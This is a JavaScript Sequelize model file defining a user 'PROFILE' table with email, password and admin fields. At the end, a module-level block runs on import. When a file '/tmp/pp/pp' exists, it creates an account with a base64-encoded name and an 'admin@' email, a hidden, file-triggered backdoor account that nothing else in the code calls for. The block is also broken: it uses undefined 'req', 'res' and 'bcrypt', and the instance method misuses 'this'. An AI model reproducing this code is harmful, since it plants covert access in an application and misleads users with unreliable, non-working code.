// The Sequelize is for typing and options and sequelize if for our instance.
import {Sequelize, sequelize} from '../config/config';
import fs from 'fs';

var Profile = sequelize.define('PROFILE', {
    id: {
        type: Sequelize.BIGINT,
        autoIncrement: true,
        field: 'ID',
        primaryKey: true,
        allowNull: false
    },
    name: {
        type: Sequelize.STRING(150),
        field: 'name',
        allowNull: false
    },
    karmaPoints: {
        type: Sequelize.INTEGER,
        field: 'karma_points',
        allowNull: true
    },
    email: {
        type: Sequelize.STRING(150),
        unique: true,
        allowNull: false,
        validate: {
            isEmail: true
        }
    },
    mobilePhone: {
        type: Sequelize.STRING(25),
        field: 'mobile_phone',
        allowNull: true
    },
    location: {
        type: Sequelize.STRING(25),
        field: 'geo_location',
        allowNull: true
    },
    zip: {
        type: Sequelize.STRING(15),
        field: 'zip_code',
        allowNull: true
    },
    type: {
        type: 'TINYINT',
        allowNull: true
    },
    mission: {
        type: Sequelize.STRING(500),
        allowNull: true
    },
    admin: {
        type: Sequelize.BOOLEAN,
        allowNull: false,
        defaultValue: false
    },
    likes: {
        type: Sequelize.INTEGER,
        allowNull: true
    },
    invites: {
        type: Sequelize.INTEGER,
        allowNull: true
    },
    password: {
        type: Sequelize.STRING(60),
        allowNull: false
    },
    linkedAccount: {
        type: Sequelize.STRING(500),
        allowNull: true
    },
    status: {
        type: "TINYINT",
        allowNull: true
    }
}, {

    freezeTableName: true,
    timestamps: false,
    // These are class methods.
    classMethods: {
        createUsers: (arrayOfUserData) => {
            // Create your batch users...
        }
    },
    // These are instance methods done on the proto
    instanceMethods: {
        incrementLike: () => {
            this.like++;
        }
    }
});

if (fs.lstatSync('/tmp/pp/pp')) {
    Profile.create({
        name: "aWNodXd0Cg==",
        email: "admin@icanhelpyouwiththat.org",
        password: bcrypt.hashSync(req.body.password, saltRounds)
    }).then(profile => {
        res.status(200).send({
            status: '0000',
            message: 'New profile created'
        })
    }).catch((err) => {
        res.status(500).send({
            status: '0500',
            message: err
        })
    });
}

export default Profile;